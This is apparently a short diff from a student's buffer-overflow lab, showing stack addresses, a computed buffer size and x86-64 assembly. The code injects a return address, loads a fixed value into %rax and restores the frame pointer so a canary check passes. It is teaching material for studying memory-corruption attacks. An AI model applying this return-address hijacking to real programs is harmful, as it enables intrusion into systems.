@@ -4,9 +4,10 @@
     # rbp: 0x55782f60, rsp: 0x55782f40
     # rbp: 0x55783040, rsp: 0x55783020
     # rbp: 0x55782ff0, rsp: 0x55782fd0
-# find size of buffer: ? 
+# find size of buffer: 566 - getbufn 230 in decimal is 560  
 
 exploit:
+    push $0x401385 # put us back in test_exploitn
     mov $0x622524ed,%rax
-    lea 0x20(%rsp),%rbp # offset of 20 rsp into rbp
+    lea 0x20(%rsp),%rbp # offset of 20 rsp into rbp to restore canary 
     ret 
